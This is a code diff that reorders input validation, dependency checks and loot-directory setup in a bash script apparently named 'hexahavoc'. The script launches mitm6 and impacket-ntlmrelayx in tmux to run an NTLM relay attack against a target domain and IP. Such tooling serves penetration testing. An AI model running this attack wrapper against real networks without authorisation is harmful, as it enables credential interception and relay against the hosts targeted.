@@ -74,24 +74,61 @@ while getopts ":d:t:i:l:vs" opt; do
   esac
 done
 
+# Ensure required arguments are provided
+if [ -z "$target_domain" ] || [ -z "$target_ip" ]; then
+  echo -e "${RED}Error: Both -d (target_domain) and -t (target_ip) arguments are required.${RESET}"
+  usage
+fi
+
+# Validate target domain
+if ! [[ "$target_domain" =~ ^([a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$ ]]; then
+  echo -e "${RED}Error: Invalid domain format.${RESET}"
+  exit 1
+fi
+
+# Validate target IP (basic check for IPv4/IPv6)
+if ! [[ "$target_ip" =~ ^[0-9a-fA-F:.]+$ ]]; then
+  echo -e "${RED}Error: Invalid IP address format.${RESET}"
+  exit 1
+fi
+
+# Check if target IP is reachable
+ping -c 1 "$target_ip" &>/dev/null || {
+  echo -e "${RED}Error: Target IP is not reachable.${RESET}"
+  exit 1
+}
+
 # Root privilege check
 if [ "$EUID" -ne 0 ]; then
   echo -e "${RED}Error: This script must be run as root.${RESET}"
   exit 1
 fi
 
-# Show the banner
-banner
-
-# Enable verbose logging if requested
-if [ "$verbose" -eq 1 ] && [ "$silent" -eq 1 ]; then
-  echo -e "${RED}Error: -v and -s flags cannot be used together.${RESET}"
-  exit 1
+# Create loot directory if it doesn't exist
+if [ ! -d "$loot_dir" ]; then
+  mkdir -p "$loot_dir"
+else
+  echo -e "${YELLOW}Warning: Loot directory '$loot_dir' already exists. Results may be overwritten.${RESET}"
 fi
 
 # Suppress console output if silent mode is enabled
 if [ "$silent" -eq 1 ]; then
   exec > >(tee -a "$loot_dir/hexahavoc.log") 2>&1
+fi
+
+# Show the banner
+banner
+
+# Check dependencies
+echo -e "${CYAN}Checking dependencies...${RESET}"
+check_command "tmux"
+check_command "mitm6"
+check_command "impacket-ntlmrelayx"
+
+# Enable verbose logging if requested
+if [ "$verbose" -eq 1 ] && [ "$silent" -eq 1 ]; then
+  echo -e "${RED}Error: -v and -s flags cannot be used together.${RESET}"
+  exit 1
 fi
 
 # Check if tmux session exists
@@ -122,36 +159,6 @@ if tmux has-session -t "$session_name" 2>/dev/null; then
   esac
 fi
 
-# Check dependencies
-echo -e "${CYAN}Checking dependencies...${RESET}"
-check_command "tmux"
-check_command "mitm6"
-check_command "impacket-ntlmrelayx"
-
-# Ensure required arguments are provided
-if [ -z "$target_domain" ] || [ -z "$target_ip" ]; then
-  echo -e "${RED}Error: Both -d (target_domain) and -t (target_ip) arguments are required.${RESET}"
-  usage
-fi
-
-# Validate target domain
-if ! [[ "$target_domain" =~ ^([a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$ ]]; then
-  echo -e "${RED}Error: Invalid domain format.${RESET}"
-  exit 1
-fi
-
-# Validate target IP (basic check for IPv4/IPv6)
-if ! [[ "$target_ip" =~ ^[0-9a-fA-F:.]+$ ]]; then
-  echo -e "${RED}Error: Invalid IP address format.${RESET}"
-  exit 1
-fi
-
-# Check if target IP is reachable
-ping -c 1 "$target_ip" &>/dev/null || {
-  echo -e "${RED}Error: Target IP is not reachable.${RESET}"
-  exit 1
-}
-
 # Create a new tmux session
 echo -e "${CYAN}Creating a new tmux session named '$session_name'...${RESET}"
 tmux new-session -d -s "$session_name"
@@ -171,13 +178,6 @@ start_tmux_window "$session_name" "mitm6" "mitm6 -i \"$interface\" -d \"$target_
   echo -e "${RED}Failed to start mitm6.${RESET}"
   exit 1
 }
-
-# Create loot directory if it doesn't exist
-if [ ! -d "$loot_dir" ]; then
-  mkdir -p "$loot_dir"
-else
-  echo -e "${YELLOW}Warning: Loot directory '$loot_dir' already exists. Results may be overwritten.${RESET}"
-fi
 
 # Start impacket-ntlmrelayx in tmux session
 echo -e "${CYAN}Starting impacket-ntlmrelayx...${RESET}"
